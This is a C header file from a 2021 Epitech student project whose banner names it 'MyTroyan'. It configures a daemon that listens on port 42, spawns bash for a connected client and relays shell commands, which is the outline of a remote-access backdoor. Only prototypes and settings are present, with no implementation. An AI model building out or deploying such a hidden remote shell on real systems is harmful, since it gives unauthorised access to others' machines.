/*
** EPITECH PROJECT, 2021
** 0_C_BASE_FILES
** File description:
** app
*/

#ifndef APP_H_
#define APP_H_

#include <ctype.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "daemon.h"
#include "socket.h"
#include "utility.h"
#include "server_t.h"

#ifdef EXIT_FAILURE
    #undef EXIT_FAILURE
#endif
#define EXIT_FAILURE 84

/// Config
#define PORT       42
#define MAX_CLIENT 1
#define LOGOUT_CMD "exit"
#define SHELL_NAME "bash"
#define EXIT_CMD   "stop"

#define APP_WELCOME "{ MyTroyan - 04/2021 - Simon RACAUD }\nWelcome\n\n"

/// Core
int app(void);

int app_process_request(server_t *server);
int signal_init(void);
int send_to_client(socket_t *client, size_t size, ...);
void app_stop(void);

/// SHELL
int shell_client_init(socket_t *client, shell_t *shell);
void shell_stop(shell_t *shell);
int send_shell_command(shell_t *shell, const char *command);

/// USER
void logout_user(server_t *server);

#endif /* !APP_H_ */
